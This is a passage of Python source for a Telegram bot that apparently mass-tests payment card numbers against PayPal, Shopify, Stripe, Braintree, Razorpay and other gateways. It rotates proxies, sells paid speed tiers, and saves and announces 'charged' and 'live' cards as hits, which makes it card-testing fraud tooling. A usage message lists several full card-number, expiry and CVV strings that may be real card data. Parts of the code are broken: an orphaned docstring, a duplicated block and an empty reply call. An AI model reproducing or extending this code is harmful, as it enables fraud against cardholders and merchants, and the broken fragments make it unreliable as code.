            status = f"⚠️ {fail_count} failures"
        else:
            status = "✅ Healthy"
        
        msg += f"{i}. <code>{site}</code> - {status}\n"
        
        if i == 20:
            msg += f"\n... and {len(sites) - 20} more sites\n"
            break
    
    msg += f"\n📊 Total: {len(sites)} sites"
    
    if user_id == OWNER_ID:
        msg += f"\n\n<i>Admin: Use /removesite &lt;site&gt; to remove a site</i>"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
# --- TEXT HANDLER ---
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.startswith('/'):
        return
    
    user_id = update.effective_user.id
    
    # ===== AUTOSOPI SITE SUBMISSION =====
    if context.user_data.get('waiting_for_autosopi_submit'):
        context.user_data.pop('waiting_for_autosopi_submit', None)
        update.message.text = f"/submitsite {update.message.text}"
        await autosopi_submit_site_command(update, context)
        return
    
    # ===== AUTOSOPI SITE TESTING =====
    if context.user_data.get('waiting_for_autosopi_test'):
        context.user_data.pop('waiting_for_autosopi_test', None)
        update.message.text = f"/testsite {update.message.text}"
        await autosopi_test_site_command(update, context)
        return
    
    # ===== AUTOSOPI SITE ADD (ADMIN) =====
    if context.user_data.get('waiting_for_autosopi_add') and user_id == OWNER_ID:
        context.user_data.pop('waiting_for_autosopi_add', None)
        update.message.text = f"/submitsite {update.message.text}"
        await autosopi_submit_site_command(update, context)
        return
    
    # ===== AUTOSOPI SITE REMOVE (ADMIN) =====
    if context.user_data.get('waiting_for_autosopi_remove') and user_id == OWNER_ID:
        context.user_data.pop('waiting_for_autosopi_remove', None)
        update.message.text = f"/removesite {update.message.text}"
        await autosopi_remove_site_command(update, context)
        return
    
    # ===== CUSTOM AMOUNT SETTING =====
    if context.user_data.get('waiting_for_amount'):
        try:
            amount = float(update.message.text)
            if 0.50 <= amount <= 1000:
                context.user_data['payment_amount'] = f"{amount:.2f}"
                context.user_data.pop('waiting_for_amount', None)
                await update.message.reply_text(f"✅ Amount set to <b>${amount:.2f}</b>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ Amount must be between $0.50 and $1000")
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Please send a number like 5.99")
        return
    
    # ===== GLOBAL PROXY ADDING =====
    if context.user_data.get('waiting_for_proxy'):
        proxy = update.message.text.strip()
        if proxy_manager.add_proxy(proxy):
            context.user_data.pop('waiting_for_proxy', None)
            await update.message.reply_text(f"✅ Proxy added to global pool: {mask_proxy(proxy)}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("❌ Invalid proxy format or already exists", parse_mode=ParseMode.HTML)
        return
    
    # ===== USER PERSONAL PROXY ADDING =====
    if context.user_data.get('waiting_for_my_proxy'):
        proxy = update.message.text.strip()
        if proxy_manager.add_user_proxy(user_id, proxy):
            context.user_data.pop('waiting_for_my_proxy', None)
            await update.message.reply_text(
                f"✅ Proxy added to your personal pool:\n{mask_proxy(proxy)}",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "❌ Invalid proxy format or already exists in your pool.",
                parse_mode=ParseMode.HTML
            )
        return
    
    # ===== USER PERSONAL PROXY REMOVAL =====
    if context.user_data.get('waiting_for_my_proxy_remove'):
        proxy = update.message.text.strip()
        if proxy_manager.remove_user_proxy(user_id, proxy):
            context.user_data.pop('waiting_for_my_proxy_remove', None)
            await update.message.reply_text(
                f"✅ Proxy removed from your pool:\n{mask_proxy(proxy)}",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "❌ Proxy not found in your pool.",
                parse_mode=ParseMode.HTML
            )
        return
    
    # ===== RAZORPAY AMOUNT SETTING =====
    if context.user_data.get('waiting_for_razorpay_amount'):
        try:
            amount = int(update.message.text)
            if 1 <= amount <= 100000:
                context.user_data['razorpay_amount'] = amount
                context.user_data.pop('waiting_for_razorpay_amount', None)
                await update.message.reply_text(f"✅ Razorpay amount set to <b>₹{amount}</b>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ Amount must be between ₹1 and ₹100000")
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Please send a number like 100")
        return
    
    # ===== RAZORPAY SITE SETTING =====
    if context.user_data.get('waiting_for_razorpay_site'):
        site = update.message.text.strip()
        context.user_data['razorpay_site'] = site
        context.user_data.pop('waiting_for_razorpay_site', None)
        await update.message.reply_text(f"✅ Razorpay site set to <b>{site}</b>", parse_mode=ParseMode.HTML)
        return
    

async def process_card_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process text as card input"""
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    # Check authorization with chat type
    if not is_user_authorized(user_id, chat.type):
        if chat.type == 'private':
            await update.message.reply_text(
                "❌ You are not authorized to use this bot in private.\n\n"
                "Join our group for free checking:\n"
                f"{REQUIRED_GROUP_LINK}",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if not await check_group_membership(update, context):
        return
    
    gateway = context.user_data.get('gateway')
    
    # Extract cards from text
    cards = card_formatter.extract_cards(update.message.text)
    
    
    # Check limits
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch} cards.")
        cards = cards[:max_batch]
    
    speed = TIER_SPEEDS.get(tier, 900)
    concurrency = TIER_CONCURRENCY.get(tier, 1)
    
    amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
    
    # Check if user has personal proxies
    user_proxy_count = proxy_manager.get_user_proxy_count(user_id)
    proxy_status = f"✅ Using {user_proxy_count} personal proxies" if user_proxy_count > 0 else "⚠️ Using global proxies"
    
    amount_display = f"${amount}" if gateway not in ['razorpay'] else f"₹{context.user_data.get('razorpay_amount', 10)}"
    
    await update.message.reply_text(
        f"💳 <b>Processing {len(cards)} card(s)</b>\n\n"
        f"💰 Amount: {amount_display}\n"
        f"🔄 Gateway: {gateway.title()}\n"
        f"🛡️ Proxy: {proxy_status}\n"
        f"⚡ Speed: {speed} cards/hour ({concurrency} parallel)\n"
        f"👥 Other users can still use the bot\n"
        f"🚀 Starting check...",
        parse_mode=ParseMode.HTML
    )
    
    # Start appropriate gateway
    if gateway == 'paypal':
        if len(cards) == 1:
            asyncio.create_task(paypal_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(mass_check_logic(update, context, cards))
    
    elif gateway == 'shopify':
        if not user_manager.can_access_gateway(user_id, 'shopify'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        if len(cards) == 1:
            asyncio.create_task(shopify_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(shopify_mass_check_logic(update, context, cards))
    
    elif gateway == 'razorpay':
        if not user_manager.can_access_gateway(user_id, 'razorpay'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        site = context.user_data.get('razorpay_site')
        if not site and len(cards) > 0:
            await update.message.reply_text("❌ <b>Site parameter required for Razorpay</b>\n\nPlease set a site first using the Razorpay menu.", parse_mode=ParseMode.HTML)
            return
        if len(cards) == 1:
            asyncio.create_task(razorpay_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(razorpay_mass_check_logic(update, context, cards))
    
    elif gateway == 'stripe_charge':
        if len(cards) == 1:
            asyncio.create_task(stripe_charge_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(stripe_charge_mass_check_logic(update, context, cards))
    
    elif gateway == 'stripe_auth':
        if len(cards) == 1:
            asyncio.create_task(stripe_auth_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(stripe_auth_mass_check_logic(update, context, cards))
    
    elif gateway == 'braintree':
        if not user_manager.can_access_gateway(user_id, 'braintree'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        if len(cards) == 1:
            asyncio.create_task(single_check_braintree_advanced(update, context))
        else:
            asyncio.create_task(mass_check_braintree_advanced(update, context))
    
    elif gateway == 'autosopi':
        if not user_manager.can_access_gateway(user_id, 'autosopi'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        if len(cards) == 1:
            asyncio.create_task(autosopi_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(autosopi_mass_check_logic(update, context, cards))
    
    elif gateway == 'payflow':
        if not user_manager.can_access_gateway(user_id, 'payflow'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return
        if len(cards) == 1:
            asyncio.create_task(payflow_single_check_logic(update, context, cards[0]))
        else:
            asyncio.create_task(payflow_mass_check_logic(update, context, cards))
    
    else:
        await update.message.reply_text(f"❌ Unknown gateway: {gateway}")
        
    
    
    
# ============ STYLISH PAYPAL RESPONSE FORMATTER (WITH GIF SUPPORT) ============
def format_paypal_response_stylish(result: Dict, card: str, bin_info: tuple, amount: str) -> Tuple[str, str]:
    """
    Format PayPal response in the STYLISH format (like the image)
    For non-hit cards (no GIF needed)
    """
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    result_text = result.get("result", "UNKNOWN")
    message = result.get("message", "Unknown")
    code = result.get("code", "")
    elapsed = result.get("elapsed", 0)
    
    # Parse card parts
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Mask card (show first 6, last 4 like in image)
    if len(card_num) >= 10:
        card_display = card_num
    else:
        card_display = card_num
    
    # Determine status emoji and display
    response_upper = f"{result_text} {message}".upper()
    
    if "CHARGED" in response_upper or "ORDER COMPLETED" in response_upper or "PAID" in response_upper:
        status_emoji = "🔥"
        status_text = "CHARGED"
        status_category_final = "charged"
    elif "INSUFFICIENT" in response_upper:
        status_emoji = "💰"
        status_text = "INSUFFICIENT FUNDS"
        status_category_final = "approved"
    elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
        status_emoji = "✅"
        status_text = "CVV LIVE"
        status_category_final = "approved"
    elif "3D" in response_upper or "OTP" in response_upper:
        status_emoji = "🔐"
        status_text = "3D REQUIRED"
        status_category_final = "approved"
    elif "DECLINED" in response_upper:
        status_emoji = "❌"
        status_text = "DECLINED"
        status_category_final = "declined"
    else:
        status_emoji = "❌"
        status_text = "DECLINED"
        status_category_final = "declined"
    
    # Extract brand
    brand = bin_info_text.split(' - ')[0] if ' - ' in bin_info_text else bin_info_text
    if len(brand) > 15:
        brand = brand[:15]
    
    # Format country
    country_name = country.replace('🌐', '').strip()
    if len(country_name) > 20:
        country_name = country_name[:17] + "..."
    
    # Format bank
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Price display
    try:
        price_float = float(amount)
        price_str = f"${price_float:.2f}"
    except:
        price_str = f"${amount}"
    
    # Build the stylish message (without GIF, for non-hit cards)
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_text}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_display}</code> | {exp_month} | {exp_year} | {cvv}\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ PayPal\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message[:80]}\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {brand}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s\n"
    )
    
    return ui, status_category_final
# ============ NEW PAYPAL COMMANDS ============

async def single_check_paypal_with_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wrapper for single check with GIF - extracts card from command args"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>PayPal Single Check</b>\n\n"
            "Usage: <code>/pp &lt;card&gt;</code>\n"
            "Example: <code>/pp 4111111111111111|12|2025|123</code>\n\n"
            "Supported formats:\n"
            "• <code>number|month|year|cvv</code>\n"
            "• <code>number month year cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = " ".join(context.args)
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: number|month|year|cvv\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    # Call the existing function with the card parameter
    await paypal_single_check_with_gif(update, context, card)


async def mass_check_paypal_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with PayPal gateway using worker mode - /mpp <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not context.args:
        await message.reply_text(
            "📦 <b>PayPal Mass Check (Worker Mode)</b>\n\n"
            "Usage: <code>/mpp &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
            "<code>/mpp 4111111111111111|12|2025|123 4222222222222222|11|2026|456</code>\n\n"
            "<b>Worker Mode:</b>\n"
            "• Premium/Ultimate: 5 workers\n"
            "• Free: 3 workers\n"
            "• Higher success rate, less 3D/OTP",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'paypal'):
        await message.reply_text("❌ Your tier doesn't have access to PayPal gateway.")
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Your tier ({tier.upper()}) only supports single card checks.\n\n"
            f"Use <code>/pp &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks with worker mode.",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Start mass check directly (NO initial message here - let mass_check_logic handle it)
    await mass_check_logic(update, context, cards)
    
async def mass_check_logic_with_gif(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """
    Mass check - sends GIF only for CHARGED cards
    """
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    username = update.effective_user.username or update.effective_user.first_name
    
    tier = user_manager.get_tier(u_id)
    
    # Worker config
    WORKER_CONFIG = {
        "free": {"workers": 3, "delay": 1.5},
        "premium": {"workers": 5, "delay": 1.0},
        "ultimate": {"workers": 10, "delay": 0.8},
        "admin": {"workers": 20, "delay": 0.5}
    }
    config = WORKER_CONFIG.get(tier, WORKER_CONFIG["free"])
    worker_count = config["workers"]
    base_delay = config["delay"]
    
    print(f"\n{'='*80}")
    print(f"👷 [WORKER MODE] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"👥 Workers: {worker_count}")
    print(f"{'='*80}")
    
    try:
        paypal_active_tasks[u_id] = True
        
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # Progress message
        progress_msg = await message.reply_text(
            f"👷 <b>Worker Mode Active</b>\n\n"
            f"🎯 Tier: {tier.upper()}\n"
            f"👥 Workers: {worker_count}\n"
            f"📝 Cards: {total}\n"
            f"💰 Amount: ${amount}\n"
            f"🔄 Starting...",
            parse_mode=ParseMode.HTML,
            reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
        )
        
        for i, card in enumerate(cards, 1):
            if u_id not in paypal_active_tasks:
                break
            
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                i-1, total, stats["charged"] + stats["approved"], stats["declined"],
                card, f"Processing {i}/{total}..."
            )
            
            await speed_controller.wait_if_needed()
            
            proxy_str = None
            if user_manager.can_use_proxy(u_id):
                proxy_str = get_rotating_proxy_for_user(u_id, 'paypal')
            
            start = time.time()
            result = await check_card_paypal(card, amount, DEFAULT_CURRENCY, proxy_str, u_id)
            elapsed = time.time() - start
            speed_controller.record_response(elapsed)
            
            bin_info = await get_bin_info(card)
            status_category = result.get("status_category", "unknown")
            response_text = result.get("message", "Unknown")
            
            # ============ FOR CHARGED CARDS: Send GIF + Result ============
            if status_category == "charged":
                stats["charged"] += 1
                
                # Send GIF with result (like the image)
                await send_gif_with_result(
                    update=update,
                    context=context,
                    card=card,
                    gateway="PayPal",
                    response=response_text,
                    price=f"${amount}",
                    bin_info=bin_info,
                    status_category="charged",
                    username=username
                )
                
                # Save hit
                await save_hit_to_file(
                    card=card, gateway="PayPal",
                    response=response_text, price=f"${amount}",
                    bin_info=bin_info, user_id=u_id, user_tier=tier
                )
                
                # Notification
                user_data = user_manager.get_user(u_id)
                await send_hit_notification(
                    context=context, gateway="PayPal", card=card,
                    response=response_text, price=f"${amount}",
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                
                user_manager.increment_hits(u_id)
                
            elif status_category == "approved":
                stats["approved"] += 1
                # Send normal result (no GIF)
                ui, _ = format_paypal_response_stylish(result, card, bin_info, amount)
                await message.reply_text(ui, parse_mode=ParseMode.HTML)
                
            elif status_category == "declined":
                stats["declined"] += 1
                # Silent
            else:
                stats["errors"] += 1
            
            user_manager.increment_checks(u_id, 1)
            stats["processed"] = i
            
            if i < total:
                await asyncio.sleep(base_delay)
        
        # Final summary
        if u_id in paypal_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            summary = (
                f"🏁 <b>Worker Mode Complete</b>\n\n"
                f"🔥 Charged: {stats['charged']}\n"
                f"✅ Live: {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {stats['total']}\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
        
    except Exception as e:
        print(f"❌ Mass check error: {e}")
        traceback.print_exc()
    finally:
        paypal_active_tasks.pop(u_id, None)
# ============ MASS CHECK COMMAND HANDLERS ============

async def mass_check_paypal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with PayPal gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ppmc <cards>  or  /ppmcheck <card1> <card2> ...\nExample: /ppmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    user_id = update.effective_user.id
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await mass_check_logic(update, context, cards)

async def mass_check_shopify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Shopify gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /shmc <cards>  or  /shmcheck <card1> <card2> ...\nExample: /shmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'shopify'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await shopify_mass_check_logic(update, context, cards)

async def mass_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Razorpay gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /rzmc <cards>  or  /rzmcheck <card1> <card2> ...\nExample: /rzmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    site = context.user_data.get('razorpay_site')
    if not site:
        await update.message.reply_text("❌ <b>Site parameter required for Razorpay</b>\n\nPlease set a site first.", parse_mode=ParseMode.HTML)
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await razorpay_mass_check_logic(update, context, cards)

async def mass_check_stripe_charge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Stripe Charge gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /stmc <cards>  or  /stmcheck <card1> <card2> ...\nExample: /stmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    user_id = update.effective_user.id
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await stripe_charge_mass_check_logic(update, context, cards)

async def mass_check_stripe_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Stripe Auth gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /stamc <cards>  or  /stamcheck <card1> <card2> ...\nExample: /stamc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    user_id = update.effective_user.id
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await stripe_auth_mass_check_logic(update, context, cards)

async def mass_check_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Braintree gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /btmc <cards>  or  /btmcheck <card1> <card2> ...\nExample: /btmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'braintree'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        print(f"⚠️ Invalid card formats: {invalid_cards}")
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await braintree_mass_check_logic(update, context, cards)


    """Mass card check with Autosopi gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>Autosopi Mass Check</b>\n\n"
            "Usage: /aumc &lt;cards&gt;  or  /aumcheck &lt;cards&gt;\n\n"
            "Examples:\n"
            "<code>/aumc 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
            "Or with line breaks:\n"
            "<code>/aumc 5185754261646119|01|34|081</code>\n"
            "<code>/aumc 4153670323274370|08|29|390</code>\n"
            "<code>/aumc 5153676988334059|06|29|803</code>\n"
            "<code>/aumc 5026452993051830|01|29|773</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'autosopi'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        await update.message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card format(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0][:30]}..."
        )
    

    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await autosopi_mass_check_logic(update, context, cards)
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'autosopi'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str)
    
    if invalid_cards:
        await update.message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card format(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0][:30]}..."
        )
    

    
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        await update.message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    await update.message.reply_text(
        parse_mode=ParseMode.HTML
    )
async def mass_check_payflow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Payflow gateway from text"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /pfmc <cards>  or  /pfmcheck <card1> <card2> ...\nExample: /pfmc 4111111111111111|12|25|123 4222222222222222|11|24|456")
        return
    
    user_id = update.effective_user.id
    if not user_manager.can_access_gateway(user_id, 'payflow'):
        await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
